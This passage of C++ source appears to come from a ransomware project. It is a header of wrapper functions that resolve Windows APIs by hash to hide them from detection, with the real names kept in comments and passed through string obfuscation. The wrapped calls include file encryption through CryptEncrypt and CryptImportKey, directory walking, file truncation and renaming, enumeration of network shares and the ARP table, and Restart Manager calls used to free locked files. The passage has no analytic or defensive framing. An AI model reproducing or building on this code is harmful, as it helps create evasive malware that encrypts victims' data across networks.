	pFunction = (HANDLE(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x663b63f4, 6);//GetProcAddress(hKernel32, OBFA("GetCurrentProcess"));
	return pFunction();
}

inline BOOL WINAPI pWriteFile(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc45f4a8c, 7);//GetProcAddress(hKernel32, OBFA("WriteFile"));
	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

inline BOOL WINAPI pWow64DisableWow64FsRedirection(
	PVOID* OldValue
)
{
	BOOL(WINAPI * pFunction)(PVOID*);
	pFunction = (BOOL(WINAPI*)(PVOID*))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1972bf90, 8);//GetProcAddress(hKernel32, OBFA("Wow64DisableWow64FsRedirection"));
	return pFunction(OldValue);
}

inline DWORD WINAPI pGetProcessId(
	HANDLE Process
)
{
	DWORD(WINAPI * pFunction)(HANDLE);
	pFunction = (DWORD(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x31d910df, 9);//GetProcAddress(hKernel32, OBFA("GetProcessId"));
	return pFunction(Process);
}

inline BOOL WINAPI pSetEndOfFile(
	HANDLE hFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xede8a61e, 10);//GetProcAddress(hKernel32, OBFA("SetEndOfFile"));
	return pFunction(hFile);
}

inline DWORD WINAPI pWaitForSingleObject(
	HANDLE hHandle,
	DWORD  dwMilliseconds
)
{
	DWORD(WINAPI * pFunction)(HANDLE, DWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6a095e21, 11);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));
	return pFunction(hHandle, dwMilliseconds);
}

inline HANDLE WINAPI pCreateFileW(
	LPCWSTR               lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
)
{
	HANDLE(WINAPI * pFunction)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf06e87ca, 12);//GetProcAddress(hKernel32, OBFA("CreateFileW"));
	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

inline DWORD WINAPI pGetFileAttributesW(
	LPCWSTR lpFileName
)
{
	DWORD(WINAPI * pFunction)(LPCWSTR);
	pFunction = (DWORD(WINAPI*)(LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x93afb23a, 13);//GetProcAddress(hKernel32, OBFA("GetFileAttributesW"));
	return pFunction(lpFileName);
}

inline BOOL WINAPI pSetFileAttributesW(
	LPCWSTR lpFileName,
	DWORD   dwFileAttributes
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, DWORD);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa62cc8e1, 14);//GetProcAddress(hKernel32, OBFA("SetFileAttributesW"));
	return pFunction(lpFileName, dwFileAttributes);
}

inline BOOL WINAPI pWow64RevertWow64FsRedirection(
	PVOID OlValue
)
{
	BOOL(WINAPI * pFunction)(PVOID);
	pFunction = (BOOL(WINAPI*)(PVOID))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78ee4dfa, 15);//GetProcAddress(hKernel32, OBFA("Wow64RevertWow64FsRedirection"));
	return pFunction(OlValue);
}

inline DWORD WINAPI pGetLastError()
{
	DWORD(WINAPI * pFunction)();
	pFunction = (DWORD(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1fbbb84f, 16);//GetProcAddress(hKernel32, OBFA("GetLastError"));
	return pFunction();
}

inline LPWSTR WINAPI plstrcatW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
)
{
	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x07ba2639, 17);//GetProcAddress(hKernel32, OBFA("lstrcatW"));
	return pFunction(lpString1, lpString2);
}

inline BOOL WINAPI pCloseHandle(
	HANDLE hObject
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa5eb6e47, 18);//GetProcAddress(hKernel32, OBFA("CloseHandle"));
	return pFunction(hObject);
}

inline void WINAPI pGetNativeSystemInfo(
	LPSYSTEM_INFO lpSystemInfo
)
{
	VOID(WINAPI * pFunction)(LPSYSTEM_INFO);
	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xdf1af05e, 19);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));
	return pFunction(lpSystemInfo);
}

inline BOOL WINAPI pSetFilePointerEx(
	HANDLE         hFile,
	LARGE_INTEGER  liDistanceToMove,
	PLARGE_INTEGER lpNewFilePointer,
	DWORD          dwMoveMethod
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd54e6bd3, 20);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));
	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);
}

inline BOOL WINAPI pCreateProcessW(
	LPCWSTR               lpApplicationName,
	LPWSTR                lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCWSTR               lpCurrentDirectory,
	LPSTARTUPINFOW        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7324a0a2, 21);//GetProcAddress(hKernel32, OBFA("CreateProcessW"));
	return pFunction(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

inline LPWSTR WINAPI plstrcpyW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
)
{
	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4d9702d0, 22);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));
	return pFunction(lpString1, lpString2);
}

inline BOOL WINAPI pMoveFileW(
	LPCWSTR lpExistingFileName,
	LPCWSTR lpNewFileName
)
{
	BOOL(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc8fb7817, 23);//GetProcAddress(hKernel32, OBFA("MoveFileW"));
	return pFunction(lpExistingFileName, lpNewFileName);
}

inline LPWSTR WINAPI pGetCommandLineW()
{
	LPWSTR(WINAPI * pFunction)();
	pFunction = (LPWSTR(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd52132a3, 24);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));
	return pFunction();
}

inline HANDLE WINAPI pCreateMutexA(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
	BOOL                  bInitialOwner,
	LPCSTR                lpName
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf701962c, 25);//GetProcAddress(hKernel32, OBFA("CreateMutexA"));
	return pFunction(lpMutexAttributes, bInitialOwner, lpName);
}

inline int WINAPI pMultiByteToWideChar(
	UINT                              CodePage,
	DWORD                             dwFlags,
	LPCCH lpMultiByteStr,
	int                               cbMultiByte,
	LPWSTR                            lpWideCharStr,
	int                               cchWideChar
)
{
	int(WINAPI * pFunction)(UINT, DWORD, LPCCH, int, LPWSTR, int);
	pFunction = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x0cd05546, 26);//GetProcAddress(hKernel32, OBFA("MultiByteToWideChar"));
	return pFunction(CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar);
}

inline HANDLE WINAPI pCreateThread(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3a4532be, 27);//GetProcAddress(hKernel32, OBFA("CreateThread"));
	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

inline int WINAPI plstrcmpiW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
)
{
	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd72e57a9, 28);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));
	return pFunction(lpString1, lpString2);
}

inline BOOL WINAPI pHeapFree(
	HANDLE                 hHeap,
	DWORD                  dwFlags,
	 LPVOID lpMem
)
{
	BOOL(WINAPI * pFunction)(HANDLE, DWORD, LPVOID);
	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3ce51c64, 29);//GetProcAddress(hKernel32, OBFA("HeapFree"));
	return pFunction(hHeap, dwFlags, lpMem);
}

inline LPVOID WINAPI pHeapAlloc(
	HANDLE hHeap,
	DWORD  dwFlags,
	SIZE_T dwBytes
)
{
	LPVOID(WINAPI * pFunction)(HANDLE, DWORD, SIZE_T);
	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x263040ab, 30);//GetProcAddress(hKernel32, OBFA("HeapAlloc"));
	return pFunction(hHeap, dwFlags, dwBytes);
}

inline HANDLE WINAPI pGetProcessHeap()
{
	HANDLE(WINAPI * pFunction)();
	pFunction = (HANDLE(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc5e8a09c, 31);//GetProcAddress(hKernel32, OBFA("GetProcessHeap"));
	return pFunction();
}

inline BOOL WINAPI pCreateTimerQueueTimer(
	PHANDLE             phNewTimer,
	HANDLE              TimerQueue,
	WAITORTIMERCALLBACK Callback,
	PVOID               DueTime,
	DWORD               Period,
	DWORD               Flags,
	ULONG               Parameter
)
{
	BOOL(WINAPI * pFunction)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
	pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x87b69cc9, 32);//GetProcAddress(hKernel32, OBFA("CreateTimerQueueTimer"));
	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);
}

inline void WINAPI pEnterCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	VOID(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x21cca665, 33);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));
	return pFunction(lpCriticalSection);
}

inline BOOL WINAPI pDeleteTimerQueue(
	HANDLE TimerQueue
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xaf17f6da, 34);//GetProcAddress(hKernel32, OBFA("DeleteTimerQueue"));
	return pFunction(TimerQueue);
}

inline void WINAPI pLeaveCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf99eabb9, 35);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));
	return pFunction(lpCriticalSection);
}

inline void WINAPI pInitializeCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5d48fbaf, 36);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));
	return pFunction(lpCriticalSection);
}

inline BOOL WINAPI pGetQueuedCompletionStatus(
	HANDLE       CompletionPort,
	LPDWORD      lpNumberOfBytesTransferred,
	PULONG_PTR   lpCompletionKey,
	LPOVERLAPPED* lpOverlapped,
	DWORD        dwMilliseconds
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd976938, 37);//GetProcAddress(hKernel32, OBFA("GetQueuedCompletionStatus"));
	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);
}

inline void WINAPI pExitThread(
	DWORD dwExitCode
)
{
	void(WINAPI * pFunction)(DWORD);
	pFunction = (void(WINAPI*)(DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb87c8bb7, 38);//GetProcAddress(hKernel32, OBFA("ExitThread"));
	return pFunction(dwExitCode);
}


inline BOOL WINAPI pPostQueuedCompletionStatus(
	_In_     HANDLE       CompletionPort,
	_In_     DWORD        dwNumberOfBytesTransferred,
	_In_     ULONG_PTR    dwCompletionKey,
	_In_opt_ LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x441bdf1e, 39);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));
	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);
}

inline void WINAPI pSleep(
	DWORD dwMilliseconds
)
{
	void(WINAPI * pFunction)(DWORD);
	pFunction = (void(WINAPI*)(DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe4b69f3b, 40);//GetProcAddress(hKernel32, OBFA("Sleep"));
	return pFunction(dwMilliseconds);
}

inline HGLOBAL WINAPI pGlobalAlloc(
	UINT   uFlags,
	SIZE_T dwBytes
)
{
	HGLOBAL(WINAPI * pFunction)(UINT, SIZE_T);
	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55710126, 41);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));
	return pFunction(uFlags, dwBytes);
}

inline HGLOBAL WINAPI pGlobalFree(
	HGLOBAL hMem
)
{
	HGLOBAL(WINAPI * pFunction)(HGLOBAL);
	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa0ee5aad, 42);//GetProcAddress(hKernel32, OBFA("GlobalFree"));
	return pFunction(hMem);
}

inline void WINAPI pDeleteCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
)
{
	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf4241d9a, 43);//GetProcAddress(hKernel32, OBFA("DeleteCriticalSection"));
	return pFunction(lpCriticalSection);
}

inline HANDLE WINAPI pCreateIoCompletionPort(
	_In_     HANDLE    FileHandle,
	_In_opt_ HANDLE    ExistingCompletionPort,
	_In_     ULONG_PTR CompletionKey,
	_In_     DWORD     NumberOfConcurrentThreads
)
{
	HANDLE(WINAPI * pFunction)(HANDLE, HANDLE, ULONG_PTR, DWORD);
	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x57b499e3, 44);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));
	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);
}

inline HANDLE WINAPI pCreateTimerQueue()
{
	HANDLE(WINAPI * pFunction)();
	pFunction = (HANDLE(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf05ad6da, 45);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));
	return pFunction();
}

inline HANDLE WINAPI pFindFirstFileW(
	LPCWSTR            lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	HANDLE(WINAPI * pFunction)(LPCWSTR, LPWIN32_FIND_DATAW);
	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe2b40f85, 46);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));
	return pFunction(lpFileName, lpFindFileData);
}

inline BOOL WINAPI pFindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPWIN32_FIND_DATAW);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPWIN32_FIND_DATAW))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aea18e1, 47);//GetProcAddress(hKernel32, OBFA("FindNextFileW"));
	return pFunction(hFindFile, lpFindFileData);
}

inline BOOL WINAPI pFindClose(
	HANDLE hFindFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x75fcf770, 48);//GetProcAddress(hKernel32, OBFA("FindClose"));
	return pFunction(hFindFile);
}

inline int WINAPI plstrcmpW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
)
{
	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x397b11df, 49);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));
	return pFunction(lpString1, lpString2);
}

inline LPVOID WINAPI pVirtualAlloc(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
)
{
	LPVOID(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, DWORD);
	pFunction = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd827c1e1, 50);//GetProcAddress(hKernel32, OBFA("VirtualAlloc"));
	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);
}

inline DWORD WINAPI pWaitForMultipleObjects(
	DWORD        nCount,
	const HANDLE* lpHandles,
	BOOL         bWaitAll,
	DWORD        dwMilliseconds
)
{
	DWORD(WINAPI * pFunction)(DWORD, const HANDLE*, BOOL, DWORD);
	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1d7ab241, 51);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));
	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);
}

inline DWORD WINAPI pGetCurrentProcessId()
{
	DWORD(WINAPI * pFunction)();
	pFunction = (DWORD(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7f0fff4e, 52);//GetProcAddress(hKernel32, OBFA("GetCurrentProcessId"));
	return pFunction();
}

inline HMODULE WINAPI pGetModuleHandleW(
	LPCWSTR lpModuleName
)
{
	HMODULE(WINAPI * pFunction)();
	pFunction = (HMODULE(WINAPI*)())api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa65b5727, 53);//GetProcAddress(hKernel32, OBFA("GetModuleHandleW"));
	return pFunction();
}





inline BOOL WINAPI pCryptImportKey(
	HCRYPTPROV hProv,
	const BYTE* pbData,
	DWORD      dwDataLen,
	HCRYPTKEY  hPubKey,
	DWORD      dwFlags,
	HCRYPTKEY* phKey
)
{
	BOOL(WINAPI * pFunction)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*))api::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xa247ff77, 54);//GetProcAddress(hAdvapi32, OBFA("CryptImportKey"));
	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);
}

inline BOOL WINAPI pCryptEncrypt(
	HCRYPTKEY  hKey,
	HCRYPTHASH hHash,
	BOOL       Final,
	DWORD      dwFlags,
	BYTE* pbData,
	DWORD* pdwDataLen,
	DWORD      dwBufLen
)
{
	BOOL(WINAPI * pFunction)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD);
	pFunction = (BOOL(WINAPI*)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD))api::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x6c6c937b, 55);//GetProcAddress(hAdvapi32, OBFA("CryptEncrypt"));
	return pFunction(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);
}

inline BOOL WINAPI pCryptGenRandom(
	HCRYPTPROV hProv,
	DWORD      dwLen,
	BYTE* pbBuffer
)
{
	BOOL(WINAPI * pFunction)(HCRYPTPROV, DWORD, BYTE*);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, DWORD, BYTE*))api::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xabcb0a67, 56);//GetProcAddress(hAdvapi32, OBFA("CryptGenRandom"));
	return pFunction(hProv, dwLen, pbBuffer);
}

inline BOOL WINAPI pCryptAcquireContextA(
	HCRYPTPROV* phProv,
	LPCSTR     szContainer,
	LPCSTR     szProvider,
	DWORD      dwProvType,
	DWORD      dwFlags
)
{
	BOOL(WINAPI * pFunction)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))api::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x5cc1ccbc, 57);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));
	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);
}







inline DWORD WINAPI pNetApiBufferFree(
	LPVOID Buffer
)
{
	DWORD(WINAPI * pFunction)(LPVOID);
	pFunction = (DWORD(WINAPI*)(LPVOID))api::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0xa1f2bf63, 58);//GetProcAddress(hNetApi32, OBFA("NetApiBufferFree"));
	return pFunction(Buffer);
}

inline  DWORD WINAPI pNetShareEnum(
	WCHAR* servername,
	DWORD   level,
	LPBYTE* bufptr,
	DWORD   prefmaxlen,
	LPDWORD entriesread,
	LPDWORD totalentries,
	LPDWORD resume_handle
)
{
	DWORD(WINAPI * pFunction)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
	pFunction = (DWORD(WINAPI*)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD))api::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x1668d771, 59);//GetProcAddress(hNetApi32, OBFA("NetShareEnum"));
	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
}


inline ULONG WINAPI pGetIpNetTable(
	PMIB_IPNETTABLE IpNetTable,
	PULONG          SizePointer,
	BOOL            Order
)
{
	ULONG(WINAPI * pFunction)(PMIB_IPNETTABLE, PULONG, BOOL);
	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))api::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xbf983c41, 60);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));
	return pFunction(IpNetTable, SizePointer, Order);
}

inline LPWSTR* WINAPI pCommandLineToArgvW(
	_In_ LPCWSTR lpCmdLine,
	_Out_ int* pNumArgs
)
{
	LPWSTR* (WINAPI * pFunction)(LPCWSTR, int*);
	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))api::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0xc7dfa7fc, 61);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));
	return pFunction(lpCmdLine, pNumArgs);
}

inline DWORD WINAPI pRmEndSession(
	DWORD dwSessionHandle
)
{
	DWORD(WINAPI * pFunction)(DWORD);
	pFunction = (DWORD(WINAPI*)(DWORD))api::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x7d154065, 62);//GetProcAddress(hRstrtmgr, OBFA("RmEndSession"));
	return pFunction(dwSessionHandle);
}


inline DWORD WINAPI pRmStartSession(
	DWORD* pSessionHandle,
	DWORD    dwSessionFlags,
	WCHAR* strSessionKey
)
{
	DWORD(WINAPI * pFunction)(DWORD*, DWORD, WCHAR*);
	pFunction = (DWORD(WINAPI*)(DWORD*, DWORD, WCHAR*))api::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xb5e437b0, 63);//GetProcAddress(hRstrtmgr, OBFA("RmStartSession"));
	return pFunction(pSessionHandle, dwSessionFlags, strSessionKey);
}

inline DWORD WINAPI pRmGetList(
	DWORD              dwSessionHandle,
	UINT* pnProcInfoNeeded,
	UINT* pnProcInfo,
	RM_PROCESS_INFO* rgAffectedApps,
	LPDWORD            lpdwRebootReasons
)
{
	DWORD(WINAPI * pFunction)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD);
	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))api::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xbbd8bcb8, 64);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));
	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);
}


inline DWORD WINAPI pRmRegisterResources(
	DWORD                dwSessionHandle,
	UINT                 nFiles,
	LPCWSTR* rgsFileNames,
	UINT                 nApplications,
	RM_UNIQUE_PROCESS* rgApplications,
	UINT                 nServices,
	LPCWSTR* rgsServiceNames
)
{
